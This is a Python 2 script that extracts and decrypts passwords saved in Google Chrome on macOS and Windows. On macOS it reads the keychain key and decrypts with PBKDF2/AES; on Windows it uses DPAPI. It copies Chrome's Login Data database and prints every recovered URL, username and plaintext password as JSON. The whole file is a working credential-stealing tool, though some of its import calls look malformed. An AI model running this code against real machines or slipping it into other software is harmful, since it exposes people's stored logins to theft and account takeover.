import platform
from getpass import getuser
from shutil import copy
import sqlite3
from os import unlink
import json
import importlib
import string


class ChromePasswd(object):
    def __init__(self):
        self.target_os = platform.system()
        if self.target_os == 'Darwin':
            self.mac_init()
        elif self.target_os == 'Windows':
            self.win_init()


    def import_libraries(self):
        if self.target_os == 'Darwin':
            globals()['AES'] = importlib.import_module('AES', 'Crypto.Cipher')
            globals()['PBKDF2'] = importlib.import_module('PBKDF2', 'Crypto.Protocol.KDF')
            globals()['subprocess'] = importlib.import_module('subprocess')

        elif self.target_os == 'Windows':
            globals()['win32crypt'] = importlib.import_module('win32crypt')


    def mac_init(self):
        self.import_libraries()
        my_pass = subprocess.Popen(
            "security find-generic-password -wa 'Chrome'",
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True)
        stdout, stderr = my_pass.communicate()
        my_pass = stdout.replace("\n", "")
        
        iterations = 1003
        salt = b'saltysalt'
        length = 16
        
        self.key = PBKDF2(my_pass, salt, length, iterations)
        self.dbpath = ( "/Users/{}/Library/Application Support/Google"
                        "/Chrome/Default/".format(getuser()))
        self.decrypt_func = self.mac_decrypt


    def mac_decrypt(self, enc_passwd):
        iv = b' ' * 16
        enc_passwd = enc_passwd[3:]
        cipher = AES.new(self.key, AES.MODE_CBC, IV=iv)
        decrypted = cipher.decrypt(enc_passwd)
        return decrypted.strip().decode('utf8')


    def win_init(self):
        self.import_libraries()
        self.dbpath = ( "C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\"
                        "User Data\\Default\\".format(getuser()))
        self.decrypt_func = self.win_decrypt


    def win_decrypt(self, enc_passwd):
        return win32crypt.CryptUnprotectData(enc_passwd, None, None, None, 0)[1]


    @property
    def getLoginDB(self):
        return self.dbpath


    def getPass(self, prettyprint=False):
        copy(self.dbpath + "Login Data", "Login Data.db")
        conn = sqlite3.connect("Login Data.db")
        cursor = conn.cursor()
        cursor.execute('''SELECT action_url, username_value, password_value
                        FROM logins''')
        data = {'data':[]}
        for result in cursor.fetchall():
            _passwd = self.decrypt_func(result[2])
            passwd = ''.join(i for i in _passwd if i in string.printable)
            if result[1] or passwd:
                d = {}
                d['url'] = result[0]
                d['username'] = result[1]
                d['password'] = passwd
                data['data'].append(d)
        conn.close()
        unlink("Login Data.db")
        
        if prettyprint:
            print json.dumps(data, indent=4)
        return data


def main():
    ch = ChromePasswd()
    print ch.getLoginDB
    ch.getPass(prettyprint=True)


if __name__ == '__main__':
    main()